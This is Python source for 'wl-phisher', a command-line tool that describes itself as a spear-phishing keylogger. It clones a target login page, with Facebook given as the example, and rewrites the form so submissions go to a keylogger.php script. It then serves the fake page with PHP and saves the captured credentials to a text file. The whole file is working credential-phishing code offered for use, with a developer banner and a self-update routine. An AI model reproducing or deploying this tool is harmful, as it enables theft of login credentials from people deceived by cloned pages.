import requests
import os
import sys
import time
import random
import string
import argparse
import subprocess as subp
from bs4 import BeautifulSoup

version = "1.2 (Beta)"
url = ""
form_action = ""
form_action_second = ""
str_line_second = ""
str_line = ""
lenght = ""

def echo(x):
    tc = {"d":"0","m":"31","h":"32","c":"36","B":"34","y":"33","p":"35"}
    for i in tc:
        x = x.replace("\%s" %i, "\033[1;%s;48m" %tc[i])
    x = x.replace("\cl", "\033[1;0;0m")
    print(x)

def update():
    echo("\c[*] Checking Version This Tool ...\d")
    time.sleep(1)
    echo("\h[+] %s\d" %version)
    echo("\c[*] Checking Update ...\d")
    checking = requests.get("https://raw.githubusercontent.com/zexceed12300/wl-phisher/master/.update")
    r = BeautifulSoup(checking.text, "html.parser")
    s = str(r)
    if "1.2 (Beta)" in s:
        echo("\h[+] No Update, This tool is latest version\d")
        echo("\m[!] Exit!\d")
        sys.exit()
    else:
        update = input("\033[1;33;48m[?] Version %s Is Available, Update Now?[y/n] \033[1;0;0m" %s)
        if "y" in update:
            echo("\h[+] Downloading Package ...")
            with open('Update.log', 'w') as updatelog:
                subp.Popen(['wget', 'https://codeload.github.com/zexceed12300/wl-phisher/zip/master'], stderr=updatelog, stdout=updatelog)
                time.sleep(1)
                echo("\h[+] Unpacking Package ...")
                time.sleep(1)
                subp.Popen(['unzip', 'master'], stderr=updatelog, stdout=updatelog)
                time.sleep(1)
                subp.Popen(['rm', 'master'], stderr=updatelog, stdout=updatelog)
                echo("\h[+] Installing Package\d")
                time.sleep(1)
                os.system("cp -rf wl-phisher-master/* ./")
                os.system("rm -rf wl-phisher-master")
                echo("\c[*] Update Finished!\d")
                echo("\m[!] Exit!\d")
            sys.exit()
        else:
            echo("\m[!] Exit!")
            sys.exit()


def cloning():
    global url
    index_file = open("./HTTPServer/index.html", "w")
    echo("\c[*] Cloning Login Page ...\d")
    try:
        response = requests.get(url)
    except requests.exceptions.MissingSchema:
        echo('\m[!] URL "%s" Does not exist, try -h/--help for helper\d' %url)
        sys.exit()
    except requests.exceptions.ConnectionError:
        echo('\m[!] URL "%s" Does not exist, try -h/--help for helper\d' % url)
        sys.exit()
    element = BeautifulSoup(response.text, "html.parser")
    content = str(element)
    index_file.write(content)
    index_file.close()
    echo("\h[+] Cloned! Saved in ./HTTPServer/index.html\d")
    time.sleep(1)
    echo("\c[*] Injecting Keylogger\d")
    time.sleep(1)
    ori_content = open("./HTTPServer/index.html", "r+")
    for line in ori_content:
        if "<form action=" in line:
            global str_line
            str_line = line
            global lenght
            lenght = str_line.__len__()
        def form_action_label():
            global str_line
            if str_line.__len__() > 200:
                line_len_start_second = str_line.find('<form action="')
                line_len_end_second = str_line.find('method="post"')
                line_second = str_line[line_len_start_second:line_len_end_second]
                global str_line_second
                str_line_second = str(line_second)
                form_len_start_second = str_line_second.find('"', 13)
                form_len_end_second = str_line_second.find(' ', 15)
                global form_action_second
                form_action_second = str_line_second[form_len_start_second:form_len_end_second]
            else:
                form_len_start = str_line.find('"', 13)
                form_len_end = str_line.find(' ', 15)
                global form_action
                form_action = str_line[form_len_start:form_len_end]
        form_action_label()
    s = open("./HTTPServer/index.html").read()
    if form_action.__len__() > str_line_second.__len__():
        if form_action=="":
            echo("\m[!] This Page Login Cannot be Injected With Keylogger!, Read README.md to create your own custom login page\d")
            echo("\m[!] Exit!\d")
            sys.exit()
        replace = s.replace(form_action, '"keylogger.php"')
    else:
        if form_action_second=="":
            echo("\m[!] This Page Login Cannot be Injected With Keylogger!, Read README.md to create your own custom login page\d")
            echo("\m[!] Exit!\d")
            sys.exit()
        replace = s.replace(form_action_second, '"keylogger.php"')
    f = open("./HTTPServer/index.html", "w")
    f.write(replace)
    f.close()
    echo("\h[+] Injected!")
    server()

def randomString(stringLength = 10):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(stringLength))
pw_name = randomString(6)

def server():
    f_pw = open("%s.txt" %pw_name, "w")
    f_pw.close()
    s = open("./HTTPServer/keylogger.php").read()
    os.system("rm ./HTTPServer/keylogger.php")
    pw_replace = s.replace("password", pw_name)
    f_password = open("./HTTPServer/keylogger.php", "w")
    f_password.write(pw_replace)
    f_password.close()
    global url
    url_replace = pw_replace.replace("URL", url)
    f_url = open("./HTTPServer/keylogger.php", "w")
    f_url.write(url_replace)
    f_url.close()
    c = input("\033[1;33;48m[?] Start Fake login Localhost Server Now?[y/n]\033[1;0;0m")
    if "y" in c:
        echo("\h[+] Server Running On Port ==> 127.0.0.1:8080\d")
        os.system("cd ./HTTPServer && php -S 127.0.0.1:8080")
        flogin_return()

    else:
        echo("\m[!] Exit!")

def flogin_return():
    s = open("./HTTPServer/keylogger.php").read()
    f_undo = open("./HTTPServer/keylogger.php", "w")
    pw_replace = s.replace(pw_name, "password")
    f_undo.write(pw_replace)
    f_undo.close()

    global url
    url_replace = pw_replace.replace(url, "URL")
    f_url = open("./HTTPServer/keylogger.php", "w")
    f_url.write(url_replace)
    f_url.close()
    echo("\n\h[+] Keylogger Information Saved On ./%s.txt" %pw_name)
    echo("\m[!] Exit!")


def usage():
    echo("""
           \h_\d    \y_ ____\d  \m_\d      \y_ ____\d   \m_\d
 \h _     _ | |\d     \m____ | |     _  ____ | |     ____  ___\d
 \h| | _ | || |\d \y__\d \m|  _ || |___ |_||  __|| |___ |  _ ||  _|\d
 \h| || || || |\d\y|__|\d\m|  __||  _  || ||__  ||  _  ||  __|| |\d
 \h\_______/|_|\d    \m| |   |_| |_||_||____||_| |_||____||_|\d
     \y_ ____\d      \m|_|\d \cWeb-Login Phisher v1.1 Beta\d \y_ _____\d

          \h[ \ySpear Phising Keylogger Attack With\d \h] 
               [ \yCustom Cloned Login Page\d \h]\d
\h---------------------------------------------------------\d
\h[+] Developer\d  \y:\d \hXenz\d\y@\mZexceed12300\d
\h[+] Contact me\d \y:\d \chttps://www.facebook.com/profile.php?id=100011531026694\d
\h[+] Github\d     \y:\d \chttps://github.com/zexceed12300\d
\h[+] Version\d    \y:\d \h1.1 (Beta)\d
\h_________________________________________________________\d               
               """)
usage()

def get_parameters():
    global url
    parser = argparse.ArgumentParser()
    parser.add_argument("-upt", "--update", help='check update release', action="store_true")
    parser.add_argument("-u", "--url", help='Clone URL page login (e.g. "--url https://facebook.com/login.php")')
    parser.add_argument("-c", "--custom", help='Your own custom index.html(login Page) (e.g. "--custom ./HTTPServer/YAHOOCustom/). Read README.md for create your own custom Login Page"')
    args = parser.parse_args()
    url = str(args.url)

    if args.custom:
        if args.url:
            echo("\m[!] Cant try -c/--custom with -u/--url. You can try one!")
            echo("\m[!] Exit!")
            sys.exit()
        if args.update:
            echo("\m[!] Cant try -c/--custom with -upt/--update. You can try one!")
            echo("\m[!] Exit!")
        if args.help:
            echo("\m[!] Cant try -c/--custom with -h/--help. You can try one!")
            echo("\m[!] Exit!")
            sys.exit()
        echo("\h[+] This Features Not Available Now(coming soon)\d")
        echo("\m[!] Exit!\d")

    elif args.update:
        if args.url:
            echo("\m[!] Cant try -upt/--update with -u/--url. You can try one!")
            echo("\m[!] Exit!")
            sys.exit()
        if args.custom:
            echo("\m[!] Cant try -upt/--update with -c/--custom. You can try one!")
            echo("\m[!] Exit!")
            sys.exit()
        if args.help:
            echo("\m[!] Cant try -upt/--update with -h/--help. You can try one!")
            echo("\m[!] Exit!")
            sys.exit()
        update()

    elif args.url:
        if args.update:
            echo("\m[!] Cant try -u/--url with -upt/--update. You can try one!")
            echo("\m[!] Exit!")
        if args.custom:
            echo("\m[!] Cant try -u/--url with -c/--custom. You can try one!")
            echo("\m[!] Exit!")
            sys.exit()
        if args.help:
            echo("\m[!] Cant try -u/--url with -h/--help. You can try one!")
            echo("\m[!] Exit!")
            sys.exit()
        cloning()
    else:
        parser.print_help()

get_parameters()

